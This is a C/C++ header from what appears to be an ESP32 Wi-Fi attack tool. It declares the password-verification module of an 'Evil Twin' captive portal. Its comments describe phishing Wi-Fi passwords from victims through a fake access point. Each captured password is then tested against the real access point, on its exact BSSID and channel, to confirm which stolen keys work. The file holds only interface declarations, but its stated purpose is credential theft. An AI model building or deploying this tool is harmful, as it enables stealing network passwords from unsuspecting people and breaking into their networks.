#pragma once
#include <stdint.h>
#include <stdbool.h>

// ---------------------------------------------------------------------------
// Evil Twin — password verification.
//
// Every time the captive portal captures a password, we quietly bring up the
// STA half of the radio (softAP stays alive, so already-caught victims don't
// drop) and try to associate with the REAL AP using those credentials, forced
// on the exact BSSID + channel we saw at scan time. WPA/WPA2/WPA3 all follow
// the same 4-way handshake success/failure signal, so a positive proves the
// key is right, and an auth-fail proves the victim typed something else.
//
// This exists because Marauder-style evil portals log EVERYTHING a victim
// types, including "asdf" or their Netflix password. Without a verification
// step the operator has to guess whether a capture is real. Idea (and the
// technique of round-tripping the AP) comes from C5Lab/projectZero (MIT).
//
// The state machine is polled from evil_portal_tick() — no extra task.
// ---------------------------------------------------------------------------

enum EvilVerifyStatus {
    EV_VERIFY_PENDING = 0,   // in queue, waiting for the radio
    EV_VERIFY_TESTING,       // STA currently attempting association
    EV_VERIFY_OK,            // real AP accepted the password
    EV_VERIFY_WRONG,         // real AP rejected the password
    EV_VERIFY_TIMEOUT,       // couldn't reach the AP in the deadline
};

// Enqueue a verify request. Copies its arguments — safe to call from the HTTP
// handler on the main task. Called from evil_portal.cpp right after log_cred.
// cred_id is echoed back in evil_verify_status() so the screen knows which
// EvilCred row got the result.
void evil_verify_enqueue(int cred_id,
                         const char *ssid, const char *password,
                         const uint8_t bssid[6], uint8_t channel);

// Ask for the current status of a specific captured credential by its id.
// Returns EV_VERIFY_PENDING if we haven't started (or never had a request).
EvilVerifyStatus evil_verify_status(int cred_id);

// Pump the state machine. Cheap when idle. Must be called from the main task
// so the WiFi mode/disconnect transitions don't race the WebServer.
void evil_verify_tick();

// Called by evil_portal_stop() so we don't leave a half-connected STA
// hanging around. Aborts any in-flight test.
void evil_verify_reset();
